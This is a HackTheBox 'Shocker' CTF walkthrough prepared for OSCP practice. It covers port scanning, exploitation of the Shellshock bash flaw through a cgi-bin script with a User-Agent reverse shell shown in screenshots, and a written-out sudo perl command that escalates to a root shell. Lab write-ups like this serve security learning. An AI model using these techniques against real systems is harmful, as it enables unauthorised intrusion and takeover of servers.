---
title: HackTheBox - Shocker
date: 2020-12-23 13:32:00 +0100
categories: [Hackthebox walkthroughs, Linux, Easy]
tags: [htb-linux-easy, dirb, cgi-bin, shellshock, CVE-2014-6271, metasploit, meterpreter, gtfobins, writeup, oscp-prep]
image: https://amirr0r.github.io/assets/img/htb/machines/linux/easy/shocker/shocker.png
---

## Foothold

### `nmap` scan

```bash
$  nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Shocker-full-port-scan.txt 10.10.10.56
Nmap scan report for 10.10.10.56
Host is up (0.099s latency).
Not shown: 65532 closed ports
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp  open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
53649/tcp filtered unknown
```

### Apache/2.4.18 (port 80) 

![dont-bug-me](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/shocker/dont-bug-me.png)

![dirb](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/shocker/dirb.png)

Seeing that there is a `/cgi-bin directory`, the webserver is probably vulnerable to Shellstock bash RCE.

> **Shellshock bash remote code execution vulnerability**: affects web servers utilizing **CGI** (**C**ommon **G**ateway **I**nterface) &rarr;  a system for generating dynamic web content. Directories such as `/cgi-sys`, `/cgi-mod`, `/cgi-bin` can be found.

Adding `-X .sh` to `dirb`, we found a [user.sh](http://10.10.10.56/cgi-bin/user.sh) file:

![user-sh](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/shocker/user-sh.png)

![user-sh-content](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/shocker/user-sh-content.png)


We can have a shell via `metasploit`:

![shellshock](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/shocker/shellshock.png)

![meterpreter](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/shocker/meterpreter.png)

However, since I do this box to get ready for **OSCP**, I want to exploit this vuln manually. Via `curl` or from `burp`, I replace `User-agent`'s content by a **reverse shell** payload:

![burp-1](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/shocker/burp-1.png)

First we've got the following error: `/bin/bash: bash: Nu such file or directory`.

So I replace `bash` by `/bin/bash` and it worked:

![burp-2](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/shocker/burp-2.png)

## User (shelly)

Flag:

![user-flag](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/shocker/user-flag.png)

We can run `perl` with sudo:

![sudo -l](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/shocker/sudo-l.png)

Let's check [GTFObins](https://gtfobins.github.io/gtfobins/perl/) privesc:

![gtfoperl](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/shocker/gtfoperl.png)

## Root

```bash
shelly@Shocker:/home/shelly$ sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/perl -e 'exec "/bin/sh";'
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
cat root.txt 
9be1ed1fbbe0c3319f9cc05dbcdb7941
```

___

## Useful links

- [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271#vulnCurrentDescriptionTitle)
- [Exploit Shellshock on a Web Server Using Metasploit](https://null-byte.wonderhowto.com/how-to/exploit-shellshock-web-server-using-metasploit-0186084/)
- [GTFObins](https://gtfobins.github.io/gtfobins/perl/)